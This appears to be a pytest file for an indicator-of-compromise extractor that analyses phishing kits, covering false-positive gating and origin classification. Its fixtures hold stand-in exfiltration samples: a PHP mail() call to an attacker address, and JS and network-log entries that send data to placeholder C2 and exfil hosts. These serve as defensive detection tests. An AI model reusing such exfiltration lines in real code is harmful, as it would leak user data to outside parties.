"""Regression tests for the false-positive gating added in PATTERN_VERSION 5.

Covers the four recommendation blocks implemented together:
  1. Resource manifest correlates on-disk files to their origin URL.
  2. Benign origin → skip regex scan; unknown origin → scan normally.
  3. Structured extract_network_iocs_from_requests_json classifies URLs.
  4. Surgical regex fixes (IPv4 version-strings, CF challenge pages,
     IP-echo bodies, JS-prone TLDs, Telegram handle context gating,
     TELEGRAM_HANDLE enum).
"""

import json
from pathlib import Path

from darla.analysis.ioc_engine import IOCExtractor, ResourceManifest
from darla.analysis.patterns import (
    IPV4_PATTERN,
    ORIGIN_BENIGN,
    ORIGIN_LURE,
    ORIGIN_UNKNOWN,
    classify_origin,
)
from darla.models.indicator import IndicatorType

# ---- Origin classification ------------------------------------------------


def test_classify_origin_benign_cdn():
    assert classify_origin(
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js",
    ) == ORIGIN_BENIGN


def test_classify_origin_microsoft_auth_cdn():
    assert classify_origin("https://aadcdn.msauth.net/shared/1.0/foo.js") == ORIGIN_BENIGN


def test_classify_origin_lure_when_root_matches():
    assert classify_origin(
        "https://relay.attacker.tld/panel.php",
        lure_root_domain="attacker.tld",
    ) == ORIGIN_LURE


def test_classify_origin_unknown_for_novel_host():
    assert classify_origin(
        "https://3iusq76ogjioew43gs5do-docsharepoint.labwcrks.com/",
    ) == ORIGIN_UNKNOWN


def test_classify_origin_empty():
    assert classify_origin("") == ORIGIN_UNKNOWN
    assert classify_origin("not-a-url") == ORIGIN_UNKNOWN


# ---- Manifest-driven scan gating -----------------------------------------


def _make_kit(tmp_path: Path, files: dict[str, str], manifest: list[dict]):
    (tmp_path / "_browser_resources").mkdir(exist_ok=True)
    for relpath, content in files.items():
        full = tmp_path / relpath
        full.parent.mkdir(parents=True, exist_ok=True)
        full.write_text(content, encoding="utf-8")
    (tmp_path / "_browser_resources" / "_manifest.json").write_text(
        json.dumps(manifest), encoding="utf-8",
    )


def test_benign_origin_resource_is_skipped(tmp_path):
    # A file served from a known CDN (here, Qualified's SaaS domain) contains
    # a list of email-provider domains that would otherwise flood the IOC
    # table with false-positive domain hits.
    _make_kit(
        tmp_path,
        {
            "_browser_resources/001_qualified.js": (
                'const providers = ["aol.it","bt.com","bellsouth.net","126.com"];\n'
            ),
        },
        [
            {
                "filename": "_browser_resources/001_qualified.js",
                "url": "https://app.qualified.com/js/qualified.js",
                "status": 200,
                "content_type": "application/javascript",
                "index": 1,
            },
        ],
    )
    result = IOCExtractor(source_url="https://attacker.tld/").scan_directory(
        str(tmp_path),
    )
    assert not any(
        ioc.value in {"aol.it", "bt.com", "bellsouth.net", "126.com"}
        for ioc in result.iocs
    ), "benign-origin file should be skipped"


def test_unknown_origin_resource_is_scanned(tmp_path):
    # Attacker-hosted JS (unknown origin) MUST still be scanned — origin
    # gating is a permission list, not a denylist.
    _make_kit(
        tmp_path,
        {
            "_browser_resources/002_loader.js": (
                'var url = "https://exfil.attacker-relay.tld/panel.php";\n'
            ),
        },
        [
            {
                "filename": "_browser_resources/002_loader.js",
                "url": "https://cdn-relay.attacker-cdn.example/loader.js",
                "status": 200,
                "content_type": "application/javascript",
                "index": 2,
            },
        ],
    )
    result = IOCExtractor(source_url="https://lure.example/").scan_directory(
        str(tmp_path),
    )
    values = {ioc.value for ioc in result.iocs}
    assert "exfil.attacker-relay.tld" in values or any(
        "panel.php" in ioc.value for ioc in result.iocs
    ), "unknown-origin file should still be scanned for IOCs"


def test_manifest_missing_does_not_break_scan(tmp_path):
    # Older kits captured before the manifest existed should still scan
    # normally; ResourceManifest.load returns an empty map.
    (tmp_path / "evil.php").write_text(
        '<?php $to="exfil@evildomain.tld"; mail($to,"x","y"); ?>',
        encoding="utf-8",
    )
    result = IOCExtractor(source_url="https://lure.example/").scan_directory(
        str(tmp_path),
    )
    assert any(
        ioc.type == IndicatorType.EMAIL and "evildomain.tld" in ioc.value
        for ioc in result.iocs
    )


# ---- Cloudflare challenge & IP-echo suppression --------------------------


def test_cloudflare_challenge_filename_skips_crypto_and_ip(tmp_path):
    # Cloudflare challenge HTMLs contain Base58-ish ray tokens that match
    # the Bitcoin regex, and embed "-1.2.1.1-" version strings that the old
    # IPv4 regex captured.  Both extractors should be disabled on these.
    cf_name = "009_foo-1776270479-1.2.1.1-c3cSTfszjhZdk_vSd.html"
    (tmp_path / "_browser_resources").mkdir()
    (tmp_path / "_browser_resources" / cf_name).write_text(
        '<html><script>var t="1x6KcpbaoyY3MjJ7SqdSqw6uTotCTqJC";'
        'var v="-1.2.1.1-";</script></html>',
        encoding="utf-8",
    )
    result = IOCExtractor().scan_directory(str(tmp_path))
    assert not any(
        ioc.type == IndicatorType.CRYPTOCURRENCY_WALLET for ioc in result.iocs
    )
    assert not any(
        ioc.type == IndicatorType.IP_ADDRESS for ioc in result.iocs
    )


def test_ip_echo_response_body_suppresses_ip_extraction(tmp_path):
    (tmp_path / "_browser_resources").mkdir()
    (tmp_path / "_browser_resources" / "027_api.ipify.org.json").write_text(
        '{"ip":"64.126.25.10"}', encoding="utf-8",
    )
    result = IOCExtractor().scan_directory(str(tmp_path))
    assert not any(
        ioc.type == IndicatorType.IP_ADDRESS and ioc.value == "64.126.25.10"
        for ioc in result.iocs
    )


# ---- Surgical regex fixes ------------------------------------------------


def test_ipv4_rejects_version_strings():
    # Dash-boundary: filename/URL version fragments like "-1.3.1.1-" or
    # "-1.2.1.1-" appear inside CF challenge filenames and must not be IPs.
    # The lookaround on ``-`` in IPV4_PATTERN is what rejects these.
    assert IPV4_PATTERN.search("-1.3.1.1-") is None
    assert IPV4_PATTERN.search("release-1.2.1.1-build") is None
    # Prose-embedded all-low-octet version strings are rejected at the
    # extractor level (see test_extract_ips_rejects_all_low_octet_version).
    # But real-looking addresses still match at the regex level.
    assert IPV4_PATTERN.search("connect to 203.0.113.42 please") is not None


def test_ipv4_rejects_leading_zero_octets():
    # 21.061.065.065 is not a valid dotted quad.
    assert IPV4_PATTERN.search("21.061.065.065") is None


def test_extract_ips_rejects_all_low_octet_version():
    extractor = IOCExtractor()
    iocs = extractor.scan_content("build=3.5.5.3", source_file="page.html")
    assert not any(ioc.type == IndicatorType.IP_ADDRESS for ioc in iocs)


def test_js_prone_tlds_expanded_filters_property_access():
    extractor = IOCExtractor()
    # he.name, ge.th, mt.host — minified JS property accesses.  SLD is a
    # short lowercase identifier (not camelCase), so the single-word/.id
    # heuristic branch catches them; we assert none survive.
    iocs = extractor.scan_content(
        "var x = he.name; var y = ge.th; var z = mt.host;",
        source_file="minified.js",
    )
    values = {ioc.value for ioc in iocs if ioc.type == IndicatorType.DOMAIN}
    assert not (values & {"he.name", "ge.th", "mt.host"})


def test_telegram_handle_requires_context_marker():
    extractor = IOCExtractor()
    # No Telegram marker on the line — should NOT extract.
    iocs = extractor.scan_content(
        'const a = "@username_that_looks_like_handle";',
        source_file="bot-detection.js",
    )
    assert not any(ioc.type == IndicatorType.TELEGRAM_HANDLE for ioc in iocs)

    # WITH marker — should extract.
    iocs = extractor.scan_content(
        'var link = "https://t.me/darkmarket_handle";',
        source_file="panel.php",
    )
    assert any(
        ioc.type == IndicatorType.TELEGRAM_HANDLE
        and ioc.value == "@darkmarket_handle"
        for ioc in iocs
    )


def test_telegram_handle_uses_dedicated_enum_value():
    extractor = IOCExtractor()
    iocs = extractor.scan_content(
        'telegram contact: @exfiluser',
        source_file="panel.php",
    )
    handle_iocs = [
        ioc for ioc in iocs if ioc.type == IndicatorType.TELEGRAM_HANDLE
    ]
    assert handle_iocs, "handle should be emitted under TELEGRAM_HANDLE"
    # And NOT under TELEGRAM_CHAT_ID anymore.
    assert not any(
        ioc.type == IndicatorType.TELEGRAM_CHAT_ID and ioc.value.startswith("@")
        for ioc in iocs
    )


# ---- Structured requests.json parsing ------------------------------------


def test_extract_network_iocs_classifies_and_dedups(tmp_path):
    requests_path = tmp_path / "requests.json"
    requests_path.write_text(json.dumps([
        # Benign CDN — should be dropped entirely.
        {"url": "https://cdnjs.cloudflare.com/ajax/libs/jquery.min.js",
         "method": "GET", "resource_type": "script", "type": "request"},
        # Same-origin as lure — suppressed (captured elsewhere).
        {"url": "https://lure.example/panel.php",
         "method": "POST", "resource_type": "xhr", "type": "request"},
        # Novel host, GET — becomes a DOMAIN IOC only.
        {"url": "https://relay1.attacker-infra.example/asset.js",
         "method": "GET", "resource_type": "script", "type": "request"},
        # Novel host, POST — DOMAIN + C2_URL.
        {"url": "https://exfil.attacker-infra.example/collect",
         "method": "POST", "resource_type": "fetch", "type": "request"},
        # Duplicate of first novel host — should not double-count.
        {"url": "https://relay1.attacker-infra.example/other.js",
         "method": "GET", "resource_type": "script", "type": "request"},
        # WebSocket — C2_URL with 90 confidence.
        {"url": "wss://ws.attacker-infra.example/tunnel",
         "method": "GET", "resource_type": "websocket", "type": "request"},
    ]), encoding="utf-8")

    iocs = IOCExtractor(
        source_url="https://lure.example/",
    ).extract_network_iocs_from_requests_json(str(requests_path))

    by_type_value = {(ioc.type, ioc.value) for ioc in iocs}

    # Benign CDN dropped.
    assert not any(
        ioc.value == "cdnjs.cloudflare.com" for ioc in iocs
    )
    # Lure same-origin dropped.
    assert not any(
        ioc.value == "lure.example" for ioc in iocs
    )
    # Novel hosts produce unique domain IOCs.
    assert (IndicatorType.DOMAIN, "relay1.attacker-infra.example") in by_type_value
    assert (IndicatorType.DOMAIN, "exfil.attacker-infra.example") in by_type_value
    assert (IndicatorType.DOMAIN, "ws.attacker-infra.example") in by_type_value
    # POST endpoint becomes a C2_URL.
    assert any(
        ioc.type == IndicatorType.C2_URL
        and ioc.value == "https://exfil.attacker-infra.example/collect"
        for ioc in iocs
    )
    # WebSocket becomes a C2_URL.
    assert any(
        ioc.type == IndicatorType.C2_URL
        and ioc.value == "wss://ws.attacker-infra.example/tunnel"
        for ioc in iocs
    )


def test_extract_network_iocs_missing_file_returns_empty(tmp_path):
    iocs = IOCExtractor().extract_network_iocs_from_requests_json(
        str(tmp_path / "does_not_exist.json"),
    )
    assert iocs == []


# ---- Manifest loader hardening -------------------------------------------


def test_manifest_load_handles_corrupt_json(tmp_path):
    (tmp_path / "_browser_resources").mkdir()
    (tmp_path / "_browser_resources" / "_manifest.json").write_text(
        "{not json", encoding="utf-8",
    )
    manifest = ResourceManifest.load(str(tmp_path))
    assert manifest.lookup("_browser_resources/anything.js") is None


def test_manifest_load_missing_file():
    manifest = ResourceManifest.load("/nonexistent-directory-xyz")
    assert manifest.lookup("any.js") is None
